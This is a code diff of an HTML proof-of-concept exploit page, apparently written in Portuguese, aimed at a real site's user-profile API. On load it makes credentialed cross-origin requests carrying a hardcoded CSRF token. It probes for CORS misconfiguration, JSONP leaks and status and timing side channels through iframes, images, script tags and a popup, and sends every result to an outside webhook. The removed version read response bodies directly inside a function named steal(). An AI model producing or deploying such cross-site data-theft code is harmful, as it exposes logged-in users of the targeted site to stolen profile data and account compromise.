@@ -1,85 +1,68 @@
 <!DOCTYPE html>
 <meta charset="utf-8">
-<title>exp-cors</title>
+<title>exp-cors-v2</title>
 <script>
-  const HOOK = 'https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';  // ← sua webhook
+  const HOOK = 'https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
 
   function log(txt){
     fetch(HOOK,{method:'POST', mode:'no-cors', body:txt}).catch(()=>{});
   }
 
-  function steal(){
-    log('init');
+  window.onload = function(){
 
-    /* 1)──── CORS comum + lê body (mais útil) ────*/
+    /* 1) iframe + onload/onerror → saberemos se deu 2xx ou 4xx/5xx */
+    const f=document.createElement('iframe');
+    f.style.display='none';
+    f.src='https://www.expert.de/api/user/profile';
+    f.onload  = () => log('V7-iframe:load  (>=200 <400)');
+    f.onerror = () => log('V7-iframe:error (>=400 ou bloqueio)');
+    document.body.appendChild(f);
+
+    /* 2) img com cookie → código de status via tamanho/timing */
+    const i=new Image();
+    i.src='https://www.expert.de/api/user/profile?c='+Date.now();
+    const t0=performance.now();
+    i.onload  = () => log('V8-img:ok  time='+(performance.now()-t0));
+    i.onerror = () => log('V8-img:err time='+(performance.now()-t0));
+
+    /* 3) GET via no-cors SEM ler body → só pega status raw */
     fetch('https://www.expert.de/api/user/profile',{
        method:'GET',
        credentials:'include',
        headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
-       mode:'cors'
+       mode:'no-cors',
+       cache:'no-cache'
     })
-    .then(r => r.status+' '+r.statusText + '\n' + r.headers.get('content-type'))
-    .then(t => log('V1: '+t))
-    .catch(e => log('V1-err:'+e));
+    .then(r => log('V9-no-cors-raw: type='+r.type+' redirected='+r.redirected))
+    .catch(e => log('V9-err:'+e));
 
-    /* 2)──── idem, mas captura body se CORS permitir ────*/
+    /* 4) HEAD request (muitos servers deixam passar sem ACAO) */
     fetch('https://www.expert.de/api/user/profile',{
-       method:'GET',
-       credentials:'include',
-       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
-       mode:'cors'
-    })
-    .then(async r => 'STATUS:'+r.status+' BODY:'+await r.text().catch(()=>'[bloqueado]'))
-    .then(t => log('V2: '+t))
-    .catch(e => log('V2-err:'+e));
-
-    /* 3)──── no-cors (body inacessível) só status/type ────*/
-    fetch('https://www.expert.de/api/user/profile',{
-       method:'GET',
+       method:'HEAD',
        credentials:'include',
        headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
        mode:'no-cors'
     })
-    .then(r => 'TYPE:'+r.type+' STATUS:'+(r.status||'opaquo'))
-    .then(t => log('V3: '+t))
-    .catch(e => log('V3-err:'+e));
+    .then(r => log('V10-HEAD: type='+r.type))
+    .catch(e => log('V10-err:'+e));
 
-    /* 4)──── POST JSON simples (testa outro verbo) ────*/
-    fetch('https://www.expert.de/api/user/profile',{
-       method:'POST',
-       credentials:'include',
-       headers:{
-          'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425',
-          'content-type':'application/json'
-       },
-       mode:'cors',
-       body:JSON.stringify({ping:'pong'})
-    })
-    .then(r => 'POST '+r.status)
-    .then(t => log('V4: '+t))
-    .catch(e => log('V4-err:'+e));
+    /* 5) <script src> com cookie – se retornar JSONP/JS válido roda */
+    const s=document.createElement('script');
+    s.src='https://www.expert.de/api/user/profile?callback=hack';
+    window.hack=(d)=>log('V11-script:'+JSON.stringify(d).slice(0,100));
+    s.onerror=()=>log('V11-script:fail');
+    document.head.appendChild(s);
 
-    /* 5)──── PUT com texto puro ────*/
-    fetch('https://www.expert.de/api/user/profile',{
-       method:'PUT',
-       credentials:'include',
-       headers:{
-          'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425',
-          'content-type':'text/plain'
-       },
-       mode:'cors',
-       body:'raw text test'
-    })
-    .then(r => 'PUT '+r.status)
-    .then(t => log('V5: '+t))
-    .catch(e => log('V5-err:'+e));
+    /* 6) window.open + depois ler location (timing attack) */
+    const w=window.open('https://www.expert.de/api/user/profile?t='+Date.now());
+    setTimeout(()=>{
+      try{
+        log('V12-popup: location='+w.location.href);
+      }catch(e){
+        log('V12-popup: blocked/SOP');
+      }
+      try{w.close();}catch(e){}
+    },1500);
 
-    /* 6)──── img tag para ping booleano (no-js fallback) ────*/
-    const i=new Image();
-    i.src='https://www.expert.de/api/user/profile?cache='+Date.now();
-    i.onload =()=>log('V6-img:ok');
-    i.onerror=()=>log('V6-img:fail');
-  }
-
-  window.onload = steal;
+  };
 </script>
